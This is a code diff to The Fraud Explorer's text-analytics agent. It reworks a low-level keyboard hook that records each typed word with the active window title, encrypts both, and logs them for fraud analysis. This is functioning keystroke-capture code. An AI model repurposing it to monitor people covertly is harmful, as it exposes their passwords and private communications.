@@ -7,8 +7,8 @@
  * Licensed under GNU GPL v3
  * https://www.thefraudexplorer.com/License
  *
- * Date: 2019-06
- * Revision: v1.3.3-ai
+ * Date: 2019-11
+ * Revision: v2.0.1-ai
  *
  * Description: Text Analytics
  */
@@ -157,43 +157,28 @@ namespace TFE_core.Analytics
                 
                     if (KeyboardWord != String.Empty)
                     {
-                        if (KeyboardWord.IndexOf("Space") != -1)
+                        if (KeyboardWord.IndexOf("Back") != -1) KeyboardWord = KeyboardWord.Replace("Back","#");
+                        if (KeyboardWord.IndexOf("Space") != -1) KeyboardWord = KeyboardWord.Replace("Space", "_");
+                        if (KeyboardWord.IndexOf("Return") != -1) KeyboardWord = KeyboardWord.Replace("Return", "^");
+                        if (KeyboardWord.IndexOf("Tab") != -1) KeyboardWord = KeyboardWord.Replace("Tab", "|");
+                        if (KeyboardWord.IndexOf("OemPeriod") != -1) KeyboardWord = KeyboardWord.Replace("OemPeriod", ".");
+                        if (KeyboardWord.IndexOf("OemComma") != -1) KeyboardWord = KeyboardWord.Replace("OemComma", ",");
+
+                        if (KeyboardWord.IndexOf("_") != -1 || KeyboardWord.IndexOf("^") != -1 || KeyboardWord.IndexOf("|") != -1 || KeyboardWord.IndexOf(".") != -1)
                         {
-                            int index = KeyboardWord.IndexOf("Space");
-                            KeyboardWord = KeyboardWord.Substring(0, index);
+                            // String sanitization
+
+                            KeyboardWord = TextHelpers.RemoveDiacritics(KeyboardWord).ToLower();
+                        
+                            // Send whole word
 
                             if (KeyboardWord.Length >= 1 && TextHelpers.WordsSanitizer(KeyboardWord) && !TextHelpers.AppsExclusion(ActiveApplTitle()))
                             {
                                 log4net.GlobalContext.Properties["TextWindow"] = Cryptography.EncRijndael(TextHelpers.RemoveDiacritics(ActiveApplTitle()));
-                                log4net.GlobalContext.Properties["Word"] = Cryptography.EncRijndael(TextHelpers.RemoveDiacritics(KeyboardWord).ToLower());
+                                log4net.GlobalContext.Properties["Word"] = Cryptography.EncRijndael(KeyboardWord);
                                 logText.Info(Cryptography.EncRijndael("TextEvent"));
                             }
-                            KeyboardWord = String.Empty;
-                        }
-                        else if (KeyboardWord.IndexOf("Return") != -1)
-                        {
-                            int index = KeyboardWord.IndexOf("Return");
-                            KeyboardWord = KeyboardWord.Substring(0, index);
 
-                            if (KeyboardWord.Length >= 1 && TextHelpers.WordsSanitizer(KeyboardWord) && !TextHelpers.AppsExclusion(ActiveApplTitle()))
-                            {
-                                log4net.GlobalContext.Properties["TextWindow"] = Cryptography.EncRijndael(TextHelpers.RemoveDiacritics(ActiveApplTitle()));
-                                log4net.GlobalContext.Properties["Word"] = Cryptography.EncRijndael(TextHelpers.RemoveDiacritics(KeyboardWord).ToLower());
-                                logText.Info(Cryptography.EncRijndael("TextEvent"));
-                            }
-                            KeyboardWord = String.Empty;
-                        }
-                        else if (KeyboardWord.IndexOf("Tab") != -1)
-                        {
-                            int index = KeyboardWord.IndexOf("Tab");
-                            KeyboardWord = KeyboardWord.Substring(0, index);
-
-                            if (KeyboardWord.Length >= 1 && TextHelpers.WordsSanitizer(KeyboardWord) && !TextHelpers.AppsExclusion(ActiveApplTitle()))
-                            {
-                                log4net.GlobalContext.Properties["TextWindow"] = Cryptography.EncRijndael(TextHelpers.RemoveDiacritics(ActiveApplTitle()));
-                                log4net.GlobalContext.Properties["Word"] = Cryptography.EncRijndael(TextHelpers.RemoveDiacritics(KeyboardWord).ToLower());
-                                logText.Info(Cryptography.EncRijndael("TextEvent"));
-                            }
                             KeyboardWord = String.Empty;
                         }
                     }
@@ -205,6 +190,7 @@ namespace TFE_core.Analytics
             }
         }
     }
+
     internal static class MIMKeys
     {
         public delegate IntPtr LowLevelKeyboardProc(int nCode, UIntPtr wParam, IntPtr lParam);
@@ -310,7 +296,13 @@ namespace TFE_core.Analytics
             {
                 System.Text.StringBuilder sbTemp = new System.Text.StringBuilder(5);
                 ToUnicodeEx(lastVKCode, lastScanCode, lastKeyState, sbTemp, sbTemp.Capacity, (uint)0, HKL);
-                lastVKCode = 0;
+
+                if (!string.IsNullOrEmpty(ret))
+                {
+                    lastVKCode = 0;
+                    lastIsDead = false;
+                }
+
                 return ret;
             }
 
